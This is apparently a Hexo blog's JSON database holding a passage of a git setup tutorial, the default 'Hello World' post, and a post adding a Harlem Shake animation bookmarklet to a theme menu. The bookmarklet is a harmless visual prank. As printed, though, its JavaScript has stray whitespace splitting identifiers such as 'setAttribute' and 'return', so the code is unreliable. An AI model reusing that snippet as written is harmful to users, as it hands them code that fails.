bootstrap/css/offcanvas.css</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff</div><div class=\"line\">#   new file:   bootstrap/js/bootstrap.js</div><div class=\"line\">#   new file:   bootstrap/js/bootstrap.min.js</div><div class=\"line\">#   new file:   bootstrap/js/holder.js</div><div class=\"line\">#   new file:   index.html</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div></pre></td></tr></table></figure></p>\n<h2 id=\"七、提交索引内容到仓库-repository\"><a href=\"#七、提交索引内容到仓库-repository\" class=\"headerlink\" title=\"七、提交索引内容到仓库(repository)\"></a>七、提交索引内容到仓库(repository)</h2><p><code>git commit -m &quot;My first commit&quot;</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">[master (root-commit) c43daef] My first commit</div><div class=\"line\">14 files changed, 9927 insertions(+)</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap-theme.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap-theme.min.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap.min.css</div><div class=\"line\">create mode 100644 bootstrap/css/custom.css</div><div class=\"line\">create mode 100755 bootstrap/css/offcanvas.css</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff</div><div class=\"line\">create mode 100644 bootstrap/js/bootstrap.js</div><div class=\"line\">create mode 100644 bootstrap/js/bootstrap.min.js</div><div class=\"line\">create mode 100755 bootstrap/js/holder.js</div><div class=\"line\">create mode 100644 index.html</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、提交索引内容到仓库-repository\"><a href=\"#八、提交索引内容到仓库-repository\" class=\"headerlink\" title=\"八、提交索引内容到仓库(repository)\"></a>八、提交索引内容到仓库(repository)</h2><p><code>git status</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div><div class=\"line\">#   bootstrap/</div><div class=\"line\">#   index.html</div><div class=\"line\">nothing added to commit but untracked files present (use &quot;git add&quot; to track)</div></pre></td></tr></table></figure></p>\n<h2 id=\"九、创建git账户及远程代码仓库\"><a href=\"#九、创建git账户及远程代码仓库\" class=\"headerlink\" title=\"九、创建git账户及远程代码仓库\"></a>九、创建git账户及远程代码仓库</h2><h2 id=\"十、连接本地仓库与远程仓库\"><a href=\"#十、连接本地仓库与远程仓库\" class=\"headerlink\" title=\"十、连接本地仓库与远程仓库\"></a>十、连接本地仓库与远程仓库</h2><p><code>git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Counting objects: 20, done.</div><div class=\"line\">Delta compression using up to 8 threads.</div><div class=\"line\">Compressing objects: 100% (20/20), done.</div><div class=\"line\">Writing objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.</div><div class=\"line\">Total 20 (delta 2), reused 0 (delta 0)</div><div class=\"line\">To https://github.com/your_name/your_repo.git</div><div class=\"line\">* [new branch]      master -&gt; master</div><div class=\"line\">Branch master set up to track remote branch master from origin.</div></pre></td></tr></table></figure></p>\n<h2 id=\"十一、推送本地仓库到远程仓库\"><a href=\"#十一、推送本地仓库到远程仓库\" class=\"headerlink\" title=\"十一、推送本地仓库到远程仓库\"></a>十一、推送本地仓库到远程仓库</h2><p><code>git push -u origin master</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Counting objects: 10, done.</div><div class=\"line\">Delta compression using up to 4 threads.</div><div class=\"line\">Compressing objects: 100% (6/6), done.</div><div class=\"line\">Writing objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.</div><div class=\"line\">Total 9 (delta 0), reused 0 (delta 0)</div><div class=\"line\">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</div><div class=\"line\">   8a82c26..90efea5  master -&gt; master</div><div class=\"line\">分支 master 设置为跟踪来自 origin 的远程分支 master。</div></pre></td></tr></table></figure></p>\n<h3 id=\"补充说明\"><a href=\"#补充说明\" class=\"headerlink\" title=\"补充说明\"></a>补充说明</h3><p>如若出现如下错误：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</div><div class=\"line\"> ! [rejected]        master -&gt; master (fetch first)</div><div class=\"line\">error: 无法推送一些引用到 &apos;git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git&apos;</div><div class=\"line\">提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外</div><div class=\"line\">提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更</div><div class=\"line\">提示：（如 &apos;git pull ...&apos;）。</div><div class=\"line\">提示：详见 &apos;git push --help&apos; 中的 &apos;Note about fast-forwards&apos; 小节。</div></pre></td></tr></table></figure></p>\n<p>说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。<br>此时，执行如下命令即可：<br><code>git pull origin master</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity</div><div class=\"line\"> * branch            master     -&gt; FETCH_HEAD</div><div class=\"line\">Merge made by the &apos;recursive&apos; strategy.</div><div class=\"line\"> LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</div><div class=\"line\"> README.md |   1 +</div><div class=\"line\"> 2 files changed, 192 insertions(+)</div><div class=\"line\"> create mode 100644 LICENSE</div><div class=\"line\"> create mode 100644 README.md</div></pre></td></tr></table></figure>"},{"title":"Hello World","date":"2015-12-29T06:06:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\nWelcome to [Hexo](http://hexo.io/)! This is your very first post. Check [documentation](http://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](http://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n","source":"_posts/article/hexo/hello-world.md","raw":"title: Hello World\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2015-12-29 14:06:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\nWelcome to [Hexo](http://hexo.io/)! This is your very first post. Check [documentation](http://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](http://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n","slug":"article/hexo/hello-world","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqg001b5nbtsvmo6l1b","content":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<p>Welcome to <a href=\"http://hexo.io/\" target=\"_blank\" rel=\"external\">Hexo</a>! This is your very first post. Check <a href=\"http://hexo.io/docs/\" target=\"_blank\" rel=\"external\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"http://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo server</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo generate</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo deploy</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<p>Welcome to <a href=\"http://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"http://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"http://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo server</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo generate</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo deploy</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/deployment.html\">Deployment</a></p>\n"},{"title":"High一下","date":"2016-02-16T10:06:00.000Z","_content":"\n<img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n让网站元素动起来，从[酷壳](http://coolshell.cn/)网站抄过来的，套到hexo博客菜单里。\n\n\n## 二、代码\n代码：themes/jacman/layout/_partial/header.ejs\n\n找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：\n``` html\n<li><a title=\"把这个链接拖到你的Chrome收藏夹工具栏中\" href='javascript:(function(){function c(){var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document    .body.removeChild(e[t])}}function p(){var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e    ){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&amp;&amp;s.height<n&amp;&amp;s.width>t&amp;&amp;s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t    .offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&amp;&amp;!isNaN(e.clientHeight)){return e.clientHeight}re    turn 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&amp;&amp;t<=b+w}    function S(){var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p    ();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener(\"ended\",function(){N();h()},true);e.innerHTML=\" <p>If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.</p> <p>\";document.body.appendChild(e);e.play()}function x(e){e.className+=\" \"+s+\" \"+o}function T(e){e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,\"\")}}var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L<    C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn(\"Could not find a node of the right size. Please try a different page.\");return}c();S();var O=[];for(var L=0;L<C.leng    th;L++){var A=C[L];if(v(A)){O.push(A)}}})()'>High一下!</a></li>\n```\n\n","source":"_posts/article/hexo/High一下.md","raw":"title: High一下\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2016-02-16 18:06:00\n---\n\n<img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n让网站元素动起来，从[酷壳](http://coolshell.cn/)网站抄过来的，套到hexo博客菜单里。\n\n\n## 二、代码\n代码：themes/jacman/layout/_partial/header.ejs\n\n找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：\n``` html\n<li><a title=\"把这个链接拖到你的Chrome收藏夹工具栏中\" href='javascript:(function(){function c(){var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document    .body.removeChild(e[t])}}function p(){var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e    ){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&amp;&amp;s.height<n&amp;&amp;s.width>t&amp;&amp;s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t    .offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&amp;&amp;!isNaN(e.clientHeight)){return e.clientHeight}re    turn 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&amp;&amp;t<=b+w}    function S(){var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p    ();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener(\"ended\",function(){N();h()},true);e.innerHTML=\" <p>If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.</p> <p>\";document.body.appendChild(e);e.play()}function x(e){e.className+=\" \"+s+\" \"+o}function T(e){e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,\"\")}}var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L<    C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn(\"Could not find a node of the right size. Please try a different page.\");return}c();S();var O=[];for(var L=0;L<C.leng    th;L++){var A=C[L];if(v(A)){O.push(A)}}})()'>High一下!</a></li>\n```\n\n","slug":"article/hexo/High一下","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqj001f5nbtgp9it2xk","content":"<p><img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<p>让网站元素动起来，从<a href=\"http://coolshell.cn/\" target=\"_blank\" rel=\"external\">酷壳</a>网站抄过来的，套到hexo博客菜单里。</p>\n<h2 id=\"二、代码\"><a href=\"#二、代码\" class=\"headerlink\" title=\"二、代码\"></a>二、代码</h2><p>代码：themes/jacman/layout/_partial/header.ejs</p>\n<p>找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">title</span>=<span class=\"string\">\"把这个链接拖到你的Chrome收藏夹工具栏中\"</span> <span class=\"attr\">href</span>=<span class=\"string\">'javascript:(function()&#123;function c()&#123;var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)&#125;function h()&#123;var e=document.getElementsByClassName(l);for(var t=0;t&lt;e.length;t++)&#123;document    .body.removeChild(e[t])&#125;&#125;function p()&#123;var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function()&#123;document.body.removeChild(e)&#125;,100)&#125;function d(e    )&#123;return&#123;height:e.offsetHeight,width:e.offsetWidth&#125;&#125;function v(i)&#123;var s=d(i);return s.height&gt;e&amp;amp;&amp;amp;s.height&lt;n&amp;amp;&amp;amp;s.width&gt;t&amp;amp;&amp;amp;s.width&lt;r&#125;function m(e)&#123;var t=e;var n=0;while(!!t)&#123;n+=t    .offsetTop;t=t.offsetParent&#125;return n&#125;function g()&#123;var e=document.documentElement;if(!!window.innerWidth)&#123;return window.innerHeight&#125;else if(e&amp;amp;&amp;amp;!isNaN(e.clientHeight))&#123;return e.clientHeight&#125;re    turn 0&#125;function y()&#123;if(window.pageYOffset)&#123;return window.pageYOffset&#125;return Math.max(document.documentElement.scrollTop,document.body.scrollTop)&#125;function E(e)&#123;var t=m(e);return t&gt;=w&amp;amp;&amp;amp;t&lt;=b+w&#125;    function S()&#123;var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function()&#123;setTimeout(function()&#123;x(k)&#125;,500);setTimeout(function()&#123;N();p    ();for(var e=0;e&lt;O.length;e++)&#123;T(O[e])&#125;&#125;,15500)&#125;,true);e.addEventListener(\"ended\",function()&#123;N();h()&#125;,true);e.innerHTML=\" &lt;p&gt;If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.&lt;/p&gt; &lt;p&gt;\";document.body.appendChild(e);e.play()&#125;function x(e)&#123;e.className+=\" \"+s+\" \"+o&#125;function T(e)&#123;e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]&#125;function N()&#123;var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n&lt;e.length;)&#123;e[n].className=e[n].className.replace(t,\"\")&#125;&#125;var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L&lt;    C.length;L++)&#123;var A=C[L];if(v(A))&#123;if(E(A))&#123;k=A;break&#125;&#125;&#125;if(A===null)&#123;console.warn(\"Could not find a node of the right size. Please try a different page.\");return&#125;c();S();var O=[];for(var L=0;L&lt;C.leng    th;L++)&#123;var A=C[L];if(v(A))&#123;O.push(A)&#125;&#125;&#125;)()'</span>&gt;</span>High一下!<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<p>让网站元素动起来，从<a href=\"http://coolshell.cn/\">酷壳</a>网站抄过来的，套到hexo博客菜单里。</p>\n<h2 id=\"二、代码\"><a href=\"#二、代码\" class=\"headerlink\" title=\"二、代码\"></a>二、代码</h2><p>代码：themes/jacman/layout/_partial/header.ejs</p>\n<p>找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">title</span>=<span class=\"string\">\"把这个链接拖到你的Chrome收藏夹工具栏中\"</span> <span class=\"attr\">href</span>=<span class=\"string\">'javascript:(function()&#123;function c()&#123;var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)&#125;function h()&#123;var e=document.getElementsByClassName(l);for(var t=0;t&lt;e.length;t++)&#123;document    .body.removeChild(e[t])&#125;&#125;function p()&#123;var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function()&#123;document.body.removeChild(e)&#125;,100)&#125;function d(e    )&#123;return&#123;height:e.offsetHeight,width:e.offsetWidth&#125;&#125;function v(i)&#123;var s=d(i);return s.height&gt;e&amp;amp;&amp;amp;s.height&lt;n&amp;amp;&amp;amp;s.width&gt;t&amp;amp;&amp;amp;s.width&lt;r&#125;function m(e)&#123;var t=e;var n=0;while(!!t)&#123;n+=t    .offsetTop;t=t.offsetParent&#125;return n&#125;function g()&#123;var e=document.documentElement;if(!!window.innerWidth)&#123;return window.innerHeight&#125;else if(e&amp;amp;&amp;amp;!isNaN(e.clientHeight))&#123;return e.clientHeight&#125;re    turn 0&#125;function y()&#123;if(window.pageYOffset)&#123;return window.pageYOffset&#125;return Math.max(document.documentElement.scrollTop,document.body.scrollTop)&#125;function E(e)&#123;var t=m(e);return t&gt;=w&amp;amp;&amp;amp;t&lt;=b+w&#125;    function S()&#123;var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function()&#123;setTimeout(function()&#123;x(k)&#125;,500);setTimeout(function()&#123;N();p    ();for(var e=0;e&lt;O.length;e++)&#123;T(O[e])&#125;&#125;,15500)&#125;,true);e.addEventListener(\"ended\",function()&#123;N();h()&#125;,true);e.innerHTML=\" &lt;p&gt;If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.&lt;/p&gt; &lt;p&gt;\";document.body.appendChild(e);e.play()&#125;function x(e)&#123;e.className+=\" \"+s+\" \"+o&#125;function T(e)&#123;e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]&#125;function N()&#123;var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n&lt;e.length;)&#123;e[n].className=e[n].className.replace(t,\"\")&#125;&#125;var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var 